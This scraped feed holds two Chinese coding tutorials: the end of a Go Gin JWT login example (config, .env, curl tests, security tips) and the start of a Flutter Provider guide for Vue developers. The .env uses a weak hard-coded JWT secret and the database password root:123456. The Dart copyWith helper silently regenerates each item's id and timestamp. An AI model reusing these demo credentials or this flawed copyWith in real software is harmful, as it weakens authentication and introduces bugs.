<h3 data-id="heading-8">2.7 utils/jwt.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> utils
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"github.com/golang-jwt/jwt/v5"</span>
)
<span class="hljs-keyword">type</span> Claims <span class="hljs-keyword">struct</span> {
    UserID <span class="hljs-type">uint</span> <span class="hljs-string">`json:"user_id"`</span>
    jwt.RegisteredClaims
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getSecret</span><span class="hljs-params">()</span></span> []<span class="hljs-type">byte</span> {
    s := os.Getenv(<span class="hljs-string">"JWT_SECRET"</span>)
    <span class="hljs-keyword">if</span> s == <span class="hljs-string">""</span> {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"请在.env文件里配置【JWT_SECRET】"</span>)
    }
    <span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>(s)
}
<span class="hljs-comment">// 生成token</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateToken</span><span class="hljs-params">(userID <span class="hljs-type">uint</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    expireHours := <span class="hljs-number">24</span>
    <span class="hljs-keyword">if</span> v := os.Getenv(<span class="hljs-string">"JWT_EXPIRE_HOURS"</span>); v != <span class="hljs-string">""</span> {
        <span class="hljs-keyword">var</span> parsed <span class="hljs-type">int</span>
        <span class="hljs-keyword">if</span> _, err := fmt.Sscanf(v, <span class="hljs-string">"%d"</span>, &amp;parsed); err == <span class="hljs-literal">nil</span> {
            expireHours = parsed
        }
    }
    claims := &amp;Claims{
        UserID: userID,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Duration(expireHours) * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            Issuer:    <span class="hljs-string">"Codee君"</span>,
        },
    }
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    <span class="hljs-keyword">return</span> token.SignedString(getSecret())
}
<span class="hljs-comment">// 解析token</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseToken</span><span class="hljs-params">(tokenStr <span class="hljs-type">string</span>)</span></span> (*Claims, <span class="hljs-type">error</span>) {
    token, err := jwt.ParseWithClaims(tokenStr, &amp;Claims{}, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(token *jwt.Token)</span></span> (<span class="hljs-keyword">interface</span>{}, <span class="hljs-type">error</span>) {
        <span class="hljs-comment">// ensure signing method is HMAC</span>
        <span class="hljs-keyword">if</span> _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"签名方法不支持: %v"</span>, token.Header[<span class="hljs-string">"alg"</span>])
        }
        <span class="hljs-keyword">return</span> getSecret(), <span class="hljs-literal">nil</span>
    })
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    <span class="hljs-keyword">if</span> claims, ok := token.Claims.(*Claims); ok &amp;&amp; token.Valid {
        <span class="hljs-keyword">return</span> claims, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"token校验失败"</span>)
}
</code></pre>
<h3 data-id="heading-9">2.8 .env</h3>
<pre><code class="hljs language-go" lang="go">PORT=<span class="hljs-number">8080</span>
JWT_SECRET=Codee君
JWT_EXPIRE_HOURS=<span class="hljs-number">24</span>
DATABASE_DSN=root:<span class="hljs-number">123456</span>@tcp(localhost:<span class="hljs-number">3306</span>)/golang_per_day?charset=utf8&amp;parseTime=True&amp;loc=Local&amp;timeout=<span class="hljs-number">1000</span>ms
</code></pre>
<h3 data-id="heading-10">2.9 go.mod</h3>
<pre><code class="hljs language-go" lang="go">module gindemo2
<span class="hljs-keyword">go</span> <span class="hljs-number">1.23</span><span class="hljs-number">.0</span>
toolchain go1<span class="hljs-number">.24</span><span class="hljs-number">.10</span>
require (
    github.com/gin-gonic/gin v1<span class="hljs-number">.11</span><span class="hljs-number">.0</span>
    github.com/golang-jwt/jwt/v5 v5<span class="hljs-number">.3</span><span class="hljs-number">.0</span>
    github.com/joho/godotenv v1<span class="hljs-number">.5</span><span class="hljs-number">.1</span>
    golang.org/x/crypto v0<span class="hljs-number">.40</span><span class="hljs-number">.0</span>
    gorm.io/driver/mysql v1<span class="hljs-number">.6</span><span class="hljs-number">.0</span>
    gorm.io/gorm v1<span class="hljs-number">.31</span><span class="hljs-number">.1</span>
)
...
</code></pre>
<h3 data-id="heading-11">2.10 main.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"github.com/joho/godotenv"</span>
    <span class="hljs-string">"gindemo2/config"</span>
    <span class="hljs-string">"gindemo2/models"</span>
    <span class="hljs-string">"gindemo2/routers"</span>
)
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 加载env变量</span>
    <span class="hljs-keyword">if</span> err := godotenv.Load(); err != <span class="hljs-literal">nil</span> {
        log.Println(<span class="hljs-string">"No .env file found — using environment variables"</span>)
    }
    <span class="hljs-comment">// 连接数据库</span>
    config.ConnectDatabase()
    <span class="hljs-comment">// 自动迁移</span>
    <span class="hljs-keyword">if</span> err := config.DB.AutoMigrate(&amp;models.User{}); err != <span class="hljs-literal">nil</span> {
        log.Fatalf(<span class="hljs-string">"AutoMigrate failed: %v"</span>, err)
    }
    <span class="hljs-comment">// 初始化路由</span>
    r := routers.InitRouter()
    port := os.Getenv(<span class="hljs-string">"PORT"</span>)
    <span class="hljs-keyword">if</span> port == <span class="hljs-string">""</span> {
        port = <span class="hljs-string">"8080"</span>
    }
    r.Run(<span class="hljs-string">":"</span> + port)
}
</code></pre>
<h2 data-id="heading-12">3、运行与测试</h2>
<h3 data-id="heading-13">3.1 初始化模块并下载依赖</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> mod tidy
</code></pre>
<h3 data-id="heading-14">3.2 启动服务</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> run .
</code></pre>
<h3 data-id="heading-15">3.3 注册用户</h3>
<pre><code class="hljs language-go" lang="go">
$ curl -X POST http:<span class="hljs-comment">//localhost:8080/api/v1/auth/reg \                                                                          </span>
  -H <span class="hljs-string">"Content-Type: application/json"</span> \                                                                                         
  -d <span class="hljs-string">'{"username":"coding_jun","passwd":"golang"}'</span>                                                                              
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"用 户 创 建 成 功 "</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}}   
</code></pre>
<h3 data-id="heading-16">3.4 登录</h3>
<pre><code class="hljs language-go" lang="go">$ curl -X POST http:<span class="hljs-comment">//localhost:8080/api/v1/auth/login \                                                                        </span>
  -H <span class="hljs-string">"Content-Type: application/json"</span> \                                                                                         
  -d <span class="hljs-string">'{"username":"coding_jun","passwd":"golang"}'</span>                                                                              
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"登 录 成 功 "</span>,<span class="hljs-string">"token"</span>:<span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc3MiOiJDb2RlZeWQmyIsImV4cCI6MTc2MzM1MTcy
MywiaWF0IjoxNzYzMjY1MzIzfQ.GKNcht6PkqzO92tQuTSfy62AO8qSgZZB4AZCULfG12M"</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}} 
</code></pre>
<h3 data-id="heading-17">3.5 访问受保护的路由</h3>
<pre><code class="hljs language-go" lang="go">$ curl -H <span class="hljs-string">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc3MiOiJDb2RlZeWQmyIsImV4cCI6MTc2MzM1M 
TcyMywiaWF0IjoxNzYzMjY1MzIzfQ.GKNcht6PkqzO92tQuTSfy62AO8qSgZZB4AZCULfG12M"</span> http:<span class="hljs-comment">//localhost:8080/api/v1/auth/me                 </span>
{<span class="hljs-string">"message"</span>:<span class="hljs-string">"查 询 成 功 "</span>,<span class="hljs-string">"user"</span>:{<span class="hljs-string">"id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"coding_jun"</span>}} 
</code></pre>
<h2 data-id="heading-18">4、安全与建议（敲黑板）</h2>
<p><em>JWT_SECRET必须强壮且保密，不要把默认密钥打包进代码；使用HTTPS；生成中建议使用Access Token+ Refresh Token来避免token的长期暴露；严格错误信息，不要在认证失败的时候返回过多细节，例如“用户不存在”就别说了；防止暴力破解，对登录尝试次数做限制；加入token黑名单，例如退出、强制下线等。</em></p>
<h2 data-id="heading-19">5、<em>源码地址</em></h2>
<p>1、公众号“Codee君”回复“源码”获取源码</p>
<p>2、<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.baidu.com%2Fs%2F1B6pgLWfSgMngVeFfSTcPdg%3Fpwd%3Djc1s" target="_blank" title="https://pan.baidu.com/s/1B6pgLWfSgMngVeFfSTcPdg?pwd=jc1s" ref="nofollow noopener noreferrer">pan.baidu.com/s/1B6pgLWfS…</a></p>
<hr/>
<p>如果您喜欢这篇文章，请您（点赞、分享、亮爱心），万分感谢！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[# Flutter Provider 状态管理精讲（Vue 开发者视角）]]></title>    <link>https://juejin.cn/post/7594093947809185826</link>    <guid>https://juejin.cn/post/7594093947809185826</guid>    <pubDate>2026-01-12T10:59:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594093947809185826" data-draft-id="7594051966890082339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="# Flutter Provider 状态管理精讲（Vue 开发者视角）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-12T10:59:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卖火箭的小男孩"/> <meta itemprop="url" content="https://juejin.cn/user/4457847613830523"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            # Flutter Provider 状态管理精讲（Vue 开发者视角）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4457847613830523/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卖火箭的小男孩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T10:59:03.000Z" title="Mon Jan 12 2026 10:59:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">📌 知识体系思维导图</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/991a295ccac84c9eb3dfdb4ecb12970c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2W54Gr566t55qE5bCP55S35a2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768820343&amp;x-signature=Rx9xQVQSJNgRXyx%2FPv9nFL%2Fi1Uo%3D" alt="Flutter Provider 核心知识体系.png" loading="lazy"/></p>
<h2 data-id="heading-1">一、Vue 到 Flutter：思维模式转换</h2>
<h3 data-id="heading-2">1.1 核心概念对比表</h3>













































<table><thead><tr><th>Vue 概念</th><th>Flutter Provider 概念</th><th>关键差异</th></tr></thead><tbody><tr><td><strong>Vuex Store</strong></td><td><code>ChangeNotifier</code> 模型类</td><td>Vuex 是单例全局存储，Provider 可以创建多个独立作用域</td></tr><tr><td><strong>State</strong></td><td>模型类中的数据字段</td><td>Flutter 中状态是显式的类属性，需要手动通知更新</td></tr><tr><td><strong>Mutations</strong></td><td>模型类中的方法 + <code>notifyListeners()</code></td><td>Flutter 没有严格的 mutations 约束，任何方法都可修改状态</td></tr><tr><td><strong>Actions</strong></td><td>模型类中的异步方法</td><td>概念类似，但不需要特殊定义</td></tr><tr><td><strong>Getters</strong></td><td>模型类中的 getter 方法</td><td>完全相同的工作原理</td></tr><tr><td><strong>mapState</strong></td><td><code>Consumer</code> / <code>Selector</code></td><td>都是订阅状态变化的机制</td></tr><tr><td><strong>this.$store</strong></td><td><code>Provider.of(context)</code></td><td>Vue 通过 this 访问，Flutter 通过 BuildContext 访问</td></tr></tbody></table>
<h3 data-id="heading-3">1.2 关键架构差异</h3>
<p><strong>Vue 响应式系统</strong>：</p>
<ul>
<li>自动依赖追踪</li>
<li>虚拟 DOM diff 更新</li>
<li>组件内可直接修改状态（非严格模式）</li>
</ul>
<p><strong>Flutter Provider 系统</strong>：</p>
<ul>
<li>手动声明依赖关系</li>
<li>Widget 树重建（非虚拟 DOM）</li>
<li><strong>不可变 Widget 树</strong>（核心差异！）</li>
<li>必须通过 <code>notifyListeners()</code> 显式通知</li>
</ul>
<h2 data-id="heading-4">二、Flutter Provider 核心机制详解</h2>
<h3 data-id="heading-5">2.1 不可变 Widget 树与重建机制</h3>
<p>这是 Vue 开发者最需要理解的 <strong>Flutter 核心理念</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Flutter Widget 是不可变的，不能这样写</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-built_in">String</span> text = <span class="hljs-string">"初始值"</span>; <span class="hljs-comment">// 这个值改变后，Widget 不会重建</span>
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Text(text);
  }
}

<span class="hljs-comment">// 正确做法：通过状态管理重建整个 Widget</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// 每次 build 都从 Provider 获取最新值</span>
    <span class="hljs-keyword">final</span> text = Provider.of&lt;MyModel&gt;(context).text;
    <span class="hljs-keyword">return</span> Text(text);
  }
}
</code></pre>
<p><strong>理解重点</strong>：</p>
<ul>
<li>每次状态变化 → <code>notifyListeners()</code> 被调用</li>
<li>依赖该状态的 Widget 的 <code>build()</code> 方法重新执行</li>
<li>Flutter 比较新旧 Widget 树差异，只更新变化的部分</li>
</ul>
<h3 data-id="heading-6">2.2 BuildContext：Flutter 的"依赖注入容器"</h3>
<p>类比 Vue 中的 <code>this</code>，但功能更强大：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Vue 方式：通过 this 访问全局 store</span>
methods: {
  addItem() {
    <span class="hljs-keyword">this</span>.$store.commit(<span class="hljs-string">'ADD_ITEM'</span>, newItem)
  }
}

<span class="hljs-comment">// Flutter 方式：通过 context 访问 Provider</span>
<span class="hljs-keyword">void</span> addItem(BuildContext context) {
  <span class="hljs-comment">// listen: false 表示"我不需要监听变化，只是读取/修改"</span>
  <span class="hljs-keyword">final</span> model = Provider.of&lt;ShoppingModel&gt;(context, listen: <span class="hljs-keyword">false</span>);
  model.addItem(newItem);
  <span class="hljs-comment">// 注意：没有类似 Vuex 的 commit 约束，直接调用方法</span>
}
</code></pre>
<h2 data-id="heading-7">三、完整开发流程示例（购物清单应用）</h2>
<h3 data-id="heading-8">3.1 第一步：创建数据模型（类比 Vuex Module）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/models/shopping_item.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingItem</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> id;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> name;
  <span class="hljs-built_in">int</span> quantity;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> price;
  <span class="hljs-built_in">bool</span> isCompleted;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> category;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">DateTime</span> createdAt;
  
  ShoppingItem({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.name,
    <span class="hljs-keyword">this</span>.quantity = <span class="hljs-number">1</span>,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.price,
    <span class="hljs-keyword">this</span>.isCompleted = <span class="hljs-keyword">false</span>,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.category,
  }) : id = <span class="hljs-built_in">DateTime</span>.now().millisecondsSinceEpoch.toString(),
       createdAt = <span class="hljs-built_in">DateTime</span>.now();
  
  <span class="hljs-comment">// 类似 Vue 中的计算属性</span>
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> totalPrice =&gt; quantity * price;
  
  <span class="hljs-comment">// 类似 Vue 中的方法，用于创建新实例（不可变性）</span>
  ShoppingItem copyWith({
    <span class="hljs-built_in">String?</span> name,
    <span class="hljs-built_in">int?</span> quantity,
    <span class="hljs-built_in">double?</span> price,
    <span class="hljs-built_in">bool?</span> isCompleted,
    <span class="hljs-built_in">String?</span> category,
  }) {
    <span class="hljs-keyword">return</span> ShoppingItem(
      name: name ?? <span class="hljs-keyword">this</span>.name,
      quantity: quantity ?? <span class="hljs-keyword">this</span>.quantity,
      price: price ?? <span class="hljs-keyword">this</span>.price,
      isCompleted: isCompleted ?? <span class="hljs-keyword">this</span>.isCompleted,
      category: category ?? <span class="hljs-keyword">this</span>.category,
    );
  }
}

<span class="hljs-comment">// lib/models/shopping_list_model.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'shopping_item.dart'</span>;

<span class="hljs-comment">// 类比 Vuex Module</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShoppingListModel</span> <span class="hljs-title">with</span> <span class="hljs-title">ChangeNotifier</span> </span>{
  <span class="hljs-comment">// 状态（State）</span>
  <span class="hljs-built_in">List</span>&lt;ShoppingItem&gt; _items = [];
  <span class="hljs-built_in">double</span> _budget = <span class="hljs-number">500.0</span>;
  <span class="hljs-built_in">String</span> _filter = <span class="hljs-string">'all'</span>; <span class="hljs-comment">// 'all', 'active', 'completed'</span>
  
  <span class="hljs-comment">// Getter（计算属性）</span>
  <span class="hljs-built_in">List</span>&lt;ShoppingItem&gt; <span class="hljs-keyword">get</span> items {
    <span class="hljs-keyword">switch</span> (_filter) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'active'</span>:
        <span class="hljs-keyword">return</span> _items.where((item) =&gt; !item.isCompleted).toList();
      <span class="hljs-keyword">case</span> <span class="hljs-string">'completed'</span>:
        <span class="hljs-keyword">return</span> _items.where((item) =&gt; item.isCompleted).toList();
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> _items;
    }
  }
  
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> totalSpent {
    <span class="hljs-keyword">return</span> _items
        .where((item) =&gt; item.isCompleted)
        .fold(<span class="hljs-number">0</span>, (sum, item) =&gt; sum + item.totalPrice);
  }
  
  <span class="hljs-built_in">double</span> <span class="hljs-keyword">get</span> remainingBudget =&gt; _budget - totalSpent;
  
  <span class="hljs-built_in">int</span> <span class="hljs-keyword">get</span> activeCount =&gt; _items.where((item) =&gt; !item.isCompleted).length;
  
  <span class="hljs-comment">// Mutations/Actions</span>
  <span class="hljs-keyword">void</span> addItem(<span class="hljs-built_in">String</span> name, <span class="hljs-built_in">double</span> price, <span class="hljs-built_in">String</span> category) {
    <span class="hljs-keyword">final</span> newItem = ShoppingItem(
      name: name,
      price: price,
      category: category,
    );
    _items.add(newItem);
    _sortItems(); <span class="hljs-comment">// 内部方法，不对外暴露</span>
    notifyListeners(); <span class="hljs-comment">// 相当于 Vuex 的 state 变化触发视图更新</span>
  }
  
  <span class="hljs-keyword">void</span> toggleItem(<span class="hljs-built_in">String</span> id) {
    <span class="hljs-keyword">final</span> index = _items.indexWhere((item) =&gt; item.id == id);
    <span class="hljs-keyword">if</span> (index != <span class="hljs-number">-1</span>) {
      <span class="hljs-comment">// 不可变性：创建新对象替换旧对象</span>
      <span class="hljs-keyword">final</span> oldItem = _items[index];
      <span class="hljs-keyword">final</span> newItem = oldItem.copyWith(
        isCompleted: !oldItem.isCompleted,
      );
      _items[index] = newItem;
      notifyListeners();
    }
  }
  
  <span class="hljs-keyword">void</span> updateQuantity(<span class="hljs-built_in">String</span> id, <span class="hljs-built_in">int</span> newQuantity) {
    <span class="hljs-keyword">final</span> index = _items.indexWhere((item) =&gt; item.id == id);
    <span class="hljs-keyword">if</span> (index != <span class="hljs-number">-1</span> &amp;&amp; newQuantity &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">final</span> oldItem = _items[index];
      <span class="hljs-keyword">final</span> newItem = oldItem.copyWith(quantity: newQuantity);
      _items[index] = newItem;
      notifyListeners();
    }
  }
  
  <span class="hljs-keyword">void</span> removeItem(<span class="hljs-built_in">String</span> id) {
    _items.removeWhere((item) =&gt; item.id == id);
    notifyListeners();
  }
  
  <span class="hljs-keyword">void</span> setFilter(<span class="hljs-built_in">String</span> filter) {
    _filter = filter;
    notifyListeners(); <span class="hljs-comment">// 过滤条件变化也需要通知</span>
  }
  
  <span class="hljs-keyword">void</span> updateBudget(<span class="hljs-built_in">double</span> newBudget) {
    _budget = newBudget;
    notifyListeners();
  }
  
  <span class="hljs-comment">// 私有方法，不需要通知外部</span>
  <span class="hljs-keyword">void</span> _sortItems() {
    _items.sort((a, b) =&gt; a.createdAt.compareTo(b.createdAt));
  }
  
  <span class="hljs-comment">// 异步 Action 示例（如从 API 加载）</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; loadInitialItems() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 模拟 API 请求</span>
    <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>));
    
    _items = [
      ShoppingItem(name: <span class="hljs-string">'牛奶'</span>, price: <span class="hljs-number">12.5</span>, category: <span class="hljs-string">'食品'</span>),
      ShoppingItem(name: <span class="hljs-string">'鸡蛋'</span>, price: <span class="hljs-number">25.0</span>, category: <span class="hljs-string">'食品'</span>, quantity: <span class="hljs-number">2</span>),
      ShoppingItem(name: <span class="hljs-string">'纸巾'</span>, price: <span class="hljs-number">15.0</span>, category: <span class="hljs-string">'日用品'</span>, isCompleted: <span class="hljs-keyword">true</span>),
    ];
    notifyListeners();
  }
}
</code></pre>
<h3 data-id="heading-9">3.2 第二步：Provider 注入（类比 Vue.use(Vuex)）</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// lib/main.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
